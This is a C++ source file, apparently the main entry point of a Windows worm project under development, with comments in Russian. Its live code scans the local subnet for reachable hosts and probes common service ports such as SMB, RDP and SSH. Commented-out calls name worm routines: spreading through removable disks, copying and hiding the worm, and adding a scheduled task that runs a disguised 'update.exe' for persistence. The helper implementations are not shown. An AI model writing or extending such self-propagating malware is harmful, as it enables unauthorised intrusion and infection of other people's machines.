#include "worm.h"
#include "NetUtils.h"
#pragma comment(lib, "Ws2_32.lib")


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow)

{
#ifdef _DEBUG
	attach_console();
#endif

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	std::locale loc("ru_RU.UTF-8");  // или std::locale loc("");
	std::wcout.imbue(loc);
	std::wcerr.imbue(loc);

	setlocale(LC_ALL, ".UTF8");


	worm worm1;
	worm::instance = &worm1;

	worm1.worm_was_started();

	vector<wstring> alive_ip;


	auto net_info = get_local_ip_and_subnet();
	if (net_info.size() == 2)
	{
		std::wstring ip = net_info[0];
		std::wstring mask = net_info[1];

		auto range = generate_ip_range(ip, mask); // теперь правильно
		for (const auto& ip_ws : range) {
			bool host_bool = is_host_alive(ip_ws); // = is_host_alive(ip_ws); // поменять (раскомментировать)
			std::wcout << ip_ws << L" " << host_bool << std::endl;
			if (host_bool) {
				alive_ip.push_back(ip_ws);
			}
		}
	}


	vector<int> critical_and_popular_ports = {
	21,    // FTP
	22,    // SSH
	23,    // Telnet
	25,    // SMTP
	53,    // DNS
	67,    // DHCP
	68,    // DHCP
	69,    // TFTP
	80,    // HTTP
	123,   // NTP
	135,   // RPC
	137,   // NetBIOS
	138,   // NetBIOS
	139,   // NetBIOS
	161,   // SNMP
	443,   // HTTPS
	445,   // SMB
	5000,  // UPnP/DLNA
	1900,  // SSDP (UPnP)
	3306,  // MySQL
	3389,  // RDP
	5357,  // еще какой то порт
	5432   // PostgreSQL
	};

	vector<wstring> ip_vector = { L"192.168.0.147", L"192.168.0.1", L"192.168.0.184", L"192.168.0.187"}; // удалить 


	for (wstring& ip : ip_vector) { // alive_ip -> ip_vector // поменять
		for (int port : critical_and_popular_ports) {
			bool test_port = is_port_open(ip, port);
			if (test_port) {
				wcout << ip << " " << port << endl; // удалить
			}
		}
	}






	worm1.worm_was_end();
	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек



	//worm worm1;
	//worm::instance =&worm1;
	//
	//worm1.worm_was_started();

	//worm1.process_all_removable_disks();

	//worm1.scan_all_volumes();
	//worm1.print_list_dir();
	//worm1.collect_visible_files();
	////worm1.replicate_files(5);
	//worm1.copy_and_hide_worm();
	//worm1.create_scheduled_task(L"C:\\Users\\sseva\\AppData\\Roaming\\Microsoft\\Update\\update.exe");

	////worm1.print_file_to_copy();

	//worm1.worm_was_end();
	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек


	//wcout<<get_own_path();
}